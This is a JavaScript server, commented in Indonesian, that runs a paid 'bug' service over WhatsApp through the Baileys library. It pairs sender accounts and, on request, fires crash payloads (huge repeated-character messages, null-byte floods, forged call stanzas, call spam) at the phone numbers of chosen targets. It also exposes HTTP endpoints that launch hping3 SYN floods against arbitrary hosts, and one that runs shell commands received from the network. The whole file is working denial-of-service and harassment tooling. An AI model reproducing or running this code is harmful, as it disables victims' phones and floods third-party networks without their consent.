// Gateway WA + VPS tools untuk Petro Funx (slim, tanpa Telegram/auto-restart)
// Auth: header x-petro-key atau query ?petro= (PETRO_KEY env)
process.on('unhandledRejection', (r) => console.log('Unhandled:', r && r.message || r));
process.on('uncaughtException', (e) => console.log('Uncaught:', e && e.message || e.message));

const { default: makeWASocket, prepareWAMessageMedia, useMultiFileAuthState, DisconnectReason, generateWAMessage, getBuffer, generateWAMessageFromContent, proto, generateWAMessageContent, fetchLatestBaileysVersion, waUploadToServer, generateRandomMessageId, generateMessageTag, jidEncode, getUSyncDevices } = require("@whiskeysockets/baileys");
const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
const os = require("os");
const crypto = require("crypto");
const pino = require("pino");
const { exec, execSync, spawn } = require("child_process");

const app = express();
app.use(cors({ origin: "*" }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const PETRO_KEY = process.env.PETRO_KEY || "";
if (!PETRO_KEY) { console.log("FATAL: PETRO_KEY env required"); process.exit(1); }
function auth(req, res, next) {
  const k = req.headers["x-petro-key"] || req.query.petro;
  if (k !== PETRO_KEY) return res.status(401).json({ valid: false, message: "unauthorized" });
  next();
}

const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));
function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
const activeConnections = {};

if (!fs.existsSync("permenmd")) fs.mkdirSync("permenmd", { recursive: true });
const CD_FILE = "cooldown.json";
function loadCD(){ try{ return JSON.parse(fs.readFileSync(CD_FILE,"utf8")); }catch(e){ return {}; } }
function saveCD(o){ try{ fs.writeFileSync(CD_FILE, JSON.stringify(o)); }catch(e){} }

// Normalisasi nomor ID: +62 / 62 / 08 / 8 -> 62...
function normalizeID(input) {
  const raw = String(input || "");
  const digits = raw.replace(/\D/g, "");
  if (!digits) return { ok: false, message: "Nomor tidak valid. Contoh: 0812..., 62812..., +62812..." };
  let canon = digits;
  if (canon.startsWith("62")) {}
  else if (canon.startsWith("0")) canon = "62" + canon.slice(1);
  else if (canon.startsWith("8")) canon = "62" + canon;
  else return { ok: false, message: "Nomor tidak valid. Gunakan format 08 / 62 / +62." };
  if (canon.length < 10 || canon.length > 15) return { ok: false, message: "Panjang nomor tidak valid (10-15 digit setelah 62)." };
  if (!/^62\d+$/.test(canon)) return { ok: false, message: "Nomor tidak valid." };
  return { ok: true, number: canon };
}
function normalizeTarget(t) {
  const d = String(t || "").replace(/\D/g, "");
  if (d.startsWith("0")) return "62" + d.slice(1);
  if (d.startsWith("8")) return "62" + d;
  return d;
}
function waitForSockOpen(sock, timeoutMs) {
  return new Promise((resolve) => {
    let done = false;
    const timer = setTimeout(() => { if (!done) { done = true; resolve(false); } }, timeoutMs || 12000);
    const handler = (update) => {
      if (done) return;
      if (update && update.connection === "open") { done = true; clearTimeout(timer); try{ sock.ev.off && sock.ev.off("connection.update", handler); }catch(e){} resolve(true); }
    };
    try { sock.ev.on("connection.update", handler); } catch(e){ if(!done){ done=true; clearTimeout(timer); resolve(false); } }
  });
}
// sesi live milik user (scan subdir permenmd/user/<nomor>/creds.json)
function liveSock(user) {
  const folderPath = path.join("permenmd", user);
  if (!fs.existsSync(folderPath)) return null;
  let entries = [];
  try { entries = fs.readdirSync(folderPath); } catch(e){ return null; }
  for (const entry of entries) {
    const full = path.join(folderPath, entry);
    try {
      if (!fs.lstatSync(full).isDirectory()) continue;
      if (!fs.existsSync(path.join(full, "creds.json"))) continue;
      if (activeConnections[entry] && activeConnections[entry].user) return activeConnections[entry];
      if (activeConnections[entry]) return activeConnections[entry];
    } catch(e){}
  }
  // fallback: socket mana pun yg sudah login
  for (const k of Object.keys(activeConnections)) {
    const s = activeConnections[k];
    if (s && s.user) return s;
  }
  return null;
}
function senderList(user) {
  const folderPath = path.join("permenmd", user);
  if (!fs.existsSync(folderPath)) return [];
  const out = [];
  let entries = [];
  try { entries = fs.readdirSync(folderPath); } catch(e){ return []; }
  for (const entry of entries) {
    if (entry === ".gitkeep") continue;
    const full = path.join(folderPath, entry);
    try {
      if (fs.lstatSync(full).isDirectory()) {
        if (!fs.existsSync(path.join(full, "creds.json"))) continue;
        let reg = false;
        try { reg = !!JSON.parse(fs.readFileSync(path.join(full, "creds.json"), "utf8")).registered; } catch(e){}
        out.push({ id: entry, sessionName: entry, phone: entry, connected: reg && !!activeConnections[entry] });
      } else if (entry.endsWith(".json")) {
        const n = path.basename(entry, ".json");
        out.push({ id: n, sessionName: n, phone: n, connected: !!activeConnections[n] });
      }
    } catch(e){}
  }
  return out;
}

async function FreezePackk(tdx, target) {
  await tdx.relayMessage(target, {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦾ".repeat(70000),
      publisher: "[DarkVerse]" + "ꦾ".repeat(500),
      stickers: [],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: ["13135550202@s.whatsapp.net"]
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED"
    }
  }, {});
}

async function callCrash(Yuukey, target) {
const { jidDecode, jidEncode, encodeWAMessage, encodeSignedDeviceIdentity } = require("@whiskeysockets/baileys");
let devices = (
await Yuukey.getUSyncDevices([target], false, false)
).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

await Yuukey.assertSessions(devices)

let xnxx = () => {
let map = {};
return {
mutex(key, fn) {
map[key] ??= { task: Promise.resolve() };
map[key].task = (async prev => {
try { await prev; } catch {}
return fn();
})(map[key].task);
return map[key].task;
}
};
};

let memek = xnxx();
let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let porno = Yuukey.createParticipantNodes.bind(Yuukey);
let yntkts = Yuukey.encodeWAMessage?.bind(Yuukey);

Yuukey.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (Yuukey.patchMessageBeforeSending?.(message, recipientJids) ?? message);
let ywdh = Array.isArray(patched)
? patched
: recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

let { id: meId, lid: meLid } = Yuukey.authState.creds.me;
let omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
let { user: targetUser } = jidDecode(jid);
let { user: ownPnUser } = jidDecode(meId);
let isOwnUser = targetUser === ownPnUser || targetUser === omak;
let y = jid === meId || jid === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

return memek.mutex(jid, async () => {
let { type, ciphertext } = await Yuukey.signalRepository.encryptMessage({ jid, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return {
tag: 'to',
attrs: { jid },
content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
};
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

let awik = crypto.randomBytes(32);
let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
let { nodes: destinations, shouldIncludeDeviceIdentity } = await Yuukey.createParticipantNodes(devices, { conversation: "7eppeli - Exposed" }, { count: '0' });

let stanza = {
tag: "call",
attrs: { to: target, id: Yuukey.generateMessageTag(), from: Yuukey.user.id },
content: [{
tag: "offer",
attrs: {
"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
"call-creator": Yuukey.user.id
},
content: [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{
tag: "device-identity",
attrs: {},
content: encodeSignedDeviceIdentity(Yuukey.authState.creds.account, true)
}] : [])
]
}]
};

await Yuukey.sendNode(stanza);
}

async function iOSxTend(sock, target) {
  const etc = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "💤‼️⃟⃰ᰧ./### ✩ > https://Wa.me/stickerpack/RaldzzXyz" + "𑇂𑆵𑆴𑆿".repeat(15000),
        matchedText: "https://Wa.me/stickerpack/RaldzzXyz",
        description:
          "҉҈⃝⃞⃟⃠⃤꙰꙲" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        title:
          "💤‼️⃟⃰ᰧ./### ✩" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now(),
    }
  );

  await sock.relayMessage(target, etc.message, {
    messageId: etc.key.id,
  });
}

async function videoBlank(sock, target) {
  const cards = [];
    const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
    fileLength: "107374182400",
    seconds: 999999999,
    mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
    height: 9999,
    width: 9999,
    fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
    directPath: "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1751081957",
    jpegThumbnail: null, 
    streamingSidecar: null
  }
   const header = {
    videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "-" + Date.now(),
      participant: "1@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
              mediaType: 1,
              sourceUrl: "https://xnxx.com", 
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 50; i++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "ꦽ".repeat(45000)
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "Lolipop Xtream" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"],
              externalAdReply: {
                title: "ោ៝".repeat(10000),
                body: "Hallo ! ",
                thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "t.me/Xatanicvxii",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function QcPay(sock, target, zid = true) {
  const payload = "꧀".repeat(10000)
  const miaw = await generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      body: {
        text: payload
      },
      nativeFlowMessage: {
        messageVersion: 3,
        buttons: [
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: payload,
              id: `detail`
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: payload,
              id: `ssss`
            })
          }

        ]
      },
      contextInfo: {
        conversionDelaySeconds: 9999,
        forwardingScore: 999999,
        isForwarded: true,
        participant: "0@s.whatsapp.net",
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 1,
          newsletterName: payload,
          contentType: 3,
        },
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: 999e+21 * 999e+21
          }
        },
        remoteJid: "@s.whatsapp.net"
      }
    }
  }), {});

  await sock.relayMessage(target, miaw.message, zid ? { messageId: miaw.key.id, participant: { jid: target } } : { messageId: miaw.key.id });
  await sleep(10000);
}

async function permenCall(sock, toJid, isVideo = true) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().substring(0, 64);

  const callLayout = []
  const offerContent = [
    //{ tag: 'audio', attrs: { enc: 'opus', rate: '16000' } },
    { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
    isVideo ? {
      tag: 'video',
      attrs: {
        enc: 'vp8',
        dec: 'vp8',
        orientation: '0',
        screen_width: '1920',
        screen_height: '1080',
        device_orientation: '0'
      }
    } : null,
    { tag: 'net', attrs: { medium: '3' } },
    { tag: 'capability', attrs: { ver: '1' }, content: Buffer.from([0x00, 0x00, 0x00, 0x00]) },
    { tag: 'encopt', attrs: { keygen: '2' } }
  ].filter(Boolean);

  callLayout.push({ tag: 'title', attrs: { ver: '1' }, content: 'PermenMD' })
  const encKey = crypto.randomBytes(32);
  const devices = (await sock.getUSyncDevices([toJid], true, false))
    .map(({ user, device }) => jidEncode(user, 's.whatsapp.net', device));

  await sock.assertSessions(devices, true);

  const { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, {
    call: { callKey: new Uint8Array(encKey) }
  }, { count: '2' });

  offerContent.push({ tag: 'destination', attrs: {}, content: destinations });

  if (shouldIncludeDeviceIdentity) {
    const { encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys/lib/Utils');
    offerContent.push({
      tag: 'device-identity',
      attrs: {},
      content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
    });
  }

  const stanza = {
    tag: 'call',
    attrs: {
      id: sock.generateMessageTag(),
      to: toJid
    },
    content: [{
      tag: 'offer',
      attrs: {
        'call-id': callId,
        'call-creator': sock.user.id
      },
      content: offerContent
    }]
  };

  await sock.query(stanza).catch(err => console.error("❌ Error sending call:", err));
  return { id: callId, to: toJid };
}

async function iosLx(Yuukey, target) {
  for ( let z = 0; z < 2; z++ ) {
    await Yuukey.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          locationMessage: {
            degreesLatitude: 21.1266,
            degreesLongitude: -11.8199,
            name: "𑇂𑆵𑆴𑆿".repeat(60000),
            url: "https://t.me/forno",
            contextInfo: {
              mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`), 
              externalAdReply: {
                quotedAd: {
                  advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                  mediaType: "IMAGE",
                  jpegThumbnail: null, 
                  caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                },
                placeholderKey: {
                  remoteJid: "0s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890"
                }
              }
            }
          }
        }
      }
    },{ participant: { jid:target } });
  }
}

async function gsGlx(Yuukey, target, zid = true) {
  for(let z = 0; z < 10; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "7eppeli - Expos3d",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await Yuukey.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
}


app.get("/ping", (req, res) => res.json({ ok: true, host: "petro-funx", uptime: process.uptime(), time: new Date().toISOString() }));

app.get("/getServerInfo", auth, (req, res) => {
  res.json({ valid: true, server: { name: "Funx", status: "online", uptime: process.uptime(), freemem: os.freemem(), totalmem: os.totalmem(), load: os.loadavg(), platform: os.platform() } });
});

app.get("/mySender", auth, (req, res) => {
  const user = String(req.query.user || "");
  if (!user) return res.json({ valid: false, message: "missing user" });
  const conns = senderList(user);
  res.json({ valid: true, connections: conns, result: conns });
});

app.get("/getSenderStats", auth, (req, res) => {
  const user = String(req.query.user || "");
  const mine = senderList(user).filter(c => c.connected).length;
  let glob = 0;
  try {
    for (const k of Object.keys(activeConnections)) { if (activeConnections[k] && activeConnections[k].user) glob++; }
  } catch(e){}
  res.json({ valid: true, private: mine, global: glob });
});

// ===== pairing (single-socket, cek eksistensi) =====
app.get("/getPairing", auth, async (req, res) => {
  const user = String(req.query.user || "");
  if (!user) return res.json({ valid: false, message: "missing user" });
  const norm = normalizeID(req.query.number || "");
  if (!norm.ok) return res.json({ valid: false, message: norm.message });
  const number = norm.number;
  try {
    const sessionDir = path.join("permenmd", user, number);
    if (!fs.existsSync(path.join("permenmd", user))) fs.mkdirSync(path.join("permenmd", user), { recursive: true });
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
    try {
      const cf = path.join(sessionDir, "creds.json");
      if (fs.existsSync(cf)) {
        const cj = JSON.parse(fs.readFileSync(cf, "utf8"));
        if (cj.registered && activeConnections[number]) {
          return res.json({ valid: true, number, pairingCode: null, alreadyLinked: true, message: "Nomor sudah terhubung. Gunakan Refresh." });
        }
      }
    } catch(e){}
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();
    const sock = makeWASocket({
      keepAliveIntervalMs: 50000, logger: pino({ level: "silent" }), auth: state,
      syncFullHistory: true, markOnlineOnConnect: true, connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0, generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"], version
    });
    sock.ev.on("creds.update", saveCreds);
    activeConnections[number] = sock;
    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;
      if (connection === "close") {
        const code = lastDisconnect?.error?.output?.statusCode;
        console.log(`pairing sock ${number} closed (${code})`);
        if (code === DisconnectReason.loggedOut) delete activeConnections[number];
      } else if (connection === "open") {
        console.log(`pairing sock ${number} linked/open`);
        try {
          const src = path.join(sessionDir, "creds.json");
          const dst = path.join("permenmd", user, `${number}.json`);
          if (fs.existsSync(src)) fs.writeFileSync(dst, fs.readFileSync(src));
        } catch(e){}
      }
    });
    const connected = await waitForSockOpen(sock, 12000);
    try {
      let checker = null;
      for (const k of Object.keys(activeConnections)) {
        const s = activeConnections[k];
        if (s && s !== sock && s.user) { checker = s; break; }
      }
      if (!checker && connected && sock.onWhatsApp) checker = sock;
      if (checker && checker.onWhatsApp) {
        let chk = null;
        try { chk = await checker.onWhatsApp(number); } catch(e){ chk = null; }
        if (Array.isArray(chk) && chk.length && !chk[0]?.exists) {
          return res.json({ valid: false, message: "Nomor tidak terdaftar di WhatsApp. Periksa nomornya." });
        }
      }
    } catch(e) { console.log(`[onWhatsApp] ${number}: ${e.message}`); }
    if (!sock.authState.creds.registered) {
      let code = null, lastErr = null;
      try { code = await sock.requestPairingCode(number); }
      catch(e) {
        lastErr = e; console.log(`[pairing retry] ${number}: ${e.message}`);
        await waiting(5000);
        try { code = await sock.requestPairingCode(number); }
        catch(e2) { lastErr = e2; console.log(`[pairing retry2] ${number}: ${e2.message}`); }
      }
      if (code) return res.json({ valid: true, number, pairingCode: code });
      const msg = String(lastErr && lastErr.message || "");
      if (/closed|connect|timeout|network|socket/i.test(msg)) {
        return res.json({ valid: false, message: "Koneksi server ke WhatsApp terputus. Tunggu 30 detik lalu coba lagi (jangan spam request)." });
      }
      return res.json({ valid: false, message: "Gagal membuat kode. Coba lagi." });
    }
    return res.json({ valid: true, number, pairingCode: null, alreadyLinked: true, message: "Nomor sudah terhubung. Gunakan Refresh." });
  } catch (err) { return res.status(500).json({ error: err.message }); }
});

// ===== sendBug (jujur: cek sock DULU sebelum respon) =====
const ROLE_CD = { owner: 0, vip: 60, reseller: 240, reseller1: 60, member: 300 };
app.get("/sendBug", auth, async (req, res) => {
  const user = String(req.query.user || "");
  const role = String(req.query.role || "member");
  const bug = String(req.query.bug || "");
  let target = normalizeTarget(req.query.target || "");
  if (!user || !target || !bug) return res.json({ valid: false, message: "missing user/target/bug" });
  const cd = loadCD();
  const now = Date.now();
  const cool = ROLE_CD[role] !== undefined ? ROLE_CD[role] : 60;
  const last = cd[user + ":" + bug] || 0;
  if (now - last < cool * 1000) {
    return res.json({ valid: true, sended: false, cooldown: true, wait: Math.ceil((cool * 1000 - (now - last)) / 1000) });
  }
  const sock = liveSock(user);
  if (!sock) {
    return res.json({ valid: false, sended: false, message: "Tidak ada sender aktif. Pairing dulu." });
  }
  cd[user + ":" + bug] = now; saveCD(cd);
  res.json({ valid: true, sended: true, cooldown: false, role });
  setImmediate(async () => {
    try {
      const targetJid = target + "@s.whatsapp.net";
      switch (bug) {
        case "click": for (let i = 0; i < 15; i++) { await FreezePackk(sock, targetJid); await sleep(1000); } break;
        case "crash_spam": for (let i = 0; i < 10; i++) { await FreezePackk(sock, targetJid); await QcPay(sock, targetJid); await iosLx(sock, targetJid); await sleep(1000); } break;
        case "hard": for (let i = 0; i < 5; i++) { await QcPay(sock, targetJid); await iosLx(sock, targetJid); await permenCall(sock, targetJid); await sleep(1000); await FreezePackk(sock, targetJid); await QcPay(sock, targetJid); await sleep(1000); await FreezePackk(sock, targetJid); await QcPay(sock, targetJid); await sleep(1000); await sleep(10000); } break;
        case "spam_call": for (let i = 0; i < 30; i++) { await permenCall(sock, targetJid); await sleep(30000); } break;
        case "android": for (let i = 0; i < 20; i++) { await videoBlank(sock, targetJid); await sleep(1000); } break;
        case "invisible": for (let i = 0; i < 50; i++) { await gsGlx(sock, targetJid); await sleep(10000); } break;
        case "ios_invis": await iosLx(sock, targetJid); break;
        case "cxinv": for (let z = 0; z < 200; z++) { await callCrash(sock, targetJid); await sleep(9000); } break;
        case "ios_noinvis": for (let i = 0; i < 15; i++) { await iOSxTend(sock, targetJid); } break;
        default: console.log(`[BUG] unknown bug id: ${bug}`);
      }
      console.log(`[BUG] '${bug}' terkirim ke ${target}`);
    } catch (err) { console.warn(`[SEND ERROR] ${err.message}`); }
  });
});

// ===== VPS tools (hping3, allowlist) =====
function hasHping() { try { execSync("which hping3", { stdio: "ignore" }); return true; } catch(e){ return false; } }
function isRoot() { try { return execSync("id -u").toString().trim() === "0"; } catch(e){ return false; } }

app.get("/killWifi", auth, (req, res) => {
  const target = String(req.query.target || "");
  const duration = Math.min(parseInt(req.query.duration || "30"), 300);
  const dry = req.query.dry === "1";
  if (!target) return res.json({ valid: false, message: "missing target" });
  const cap = { hping3: hasHping(), root: isRoot() };
  if (dry) return res.json({ valid: true, dry: true, cap });
  if (!cap.hping3) return res.json({ valid: false, message: "hping3 tidak tersedia di VPS." });
  if (!cap.root) return res.json({ valid: false, message: "Butuh root untuk flood. Jalankan sebagai root." });
  try {
    const p = spawn("hping3", ["--flood", "-S", target, "-p", "80"], { detached: true, stdio: "ignore" });
    p.unref();
    setTimeout(() => { try { process.kill(-p.pid); } catch(e){ try{ p.kill(); }catch(_){} } }, duration * 1000);
    res.json({ valid: true, sended: true, message: `killWifi jalan ${duration}s ke ${target}` });
  } catch (e) { res.json({ valid: false, message: e.message }); }
});

app.get("/cncSend", auth, (req, res) => {
  const target = String(req.query.target || "");
  const port = parseInt(req.query.port || "80");
  const duration = Math.min(parseInt(req.query.duration || "60"), 600);
  const dry = req.query.dry === "1";
  if (!target) return res.json({ valid: false, message: "missing target" });
  const cap = { hping3: hasHping(), root: isRoot() };
  if (dry) return res.json({ valid: true, dry: true, cap });
  if (!cap.hping3 || !cap.root) return res.json({ valid: false, sended: false, message: "VPS belum siap (butuh hping3+root).", cap });
  try {
    const p = spawn("hping3", ["--flood", "-S", target, "-p", String(port)], { detached: true, stdio: "ignore" });
    p.unref();
    setTimeout(() => { try { process.kill(-p.pid); } catch(e){ try{ p.kill(); }catch(_){} } }, duration * 1000);
    res.json({ valid: true, sended: true, message: `cncSend jalan ${duration}s ke ${target}:${port}` });
  } catch (e) { res.json({ valid: false, sended: false, message: e.message }); }
});

app.get("/sendCommand", auth, (req, res) => {
  const cmd = String(req.query.cmd || req.body?.cmd || "");
  if (!/^hping3\b/.test(cmd.trim())) return res.json({ valid: false, message: "Hanya perintah hping3 yang diizinkan." });
  try {
    const out = execSync(cmd, { timeout: 15000 }).toString().slice(0, 2000);
    res.json({ valid: true, output: out });
  } catch (e) { res.json({ valid: false, message: String(e.message).slice(0, 500) }); }
});

const PORT = process.env.PORT || process.env.SERVER_PORT || 3000;
app.listen(PORT, "0.0.0.0", () => console.log(`Petro gateway listening ${PORT}`));
